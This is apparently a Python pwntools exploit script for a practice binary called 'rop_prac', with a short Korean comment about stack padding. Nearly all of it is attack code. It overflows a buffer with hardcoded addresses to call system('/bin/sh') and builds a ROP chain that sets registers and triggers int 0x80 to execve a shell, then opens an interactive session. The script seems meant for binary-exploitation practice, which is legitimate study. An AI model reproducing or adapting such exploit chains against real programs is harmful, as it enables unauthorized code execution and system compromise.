#! -*- coding:utf-8 -*-
from pwn import *

p=process("./rop_prac")

system=0x804fb20
binsh=0x80acacc
eax=0x080a3ca4
dcb=0x0806eec1
int0=0x806f7d0

pay="a"*24
pay+=p32(system)+"a"*4+p32(binsh) 
#a*4 더미 씌워주는 이유. 함수 변수가져올때 4바이트 띄고 가져옴

pay2="a"*24
pay2+=p32(eax)+p32(0x0b)
pay2+=p32(dcb)+p32(0)+p32(0)+p32(binsh)
pay2+=p32(int0)

p.sendline(pay2)
p.interactive()

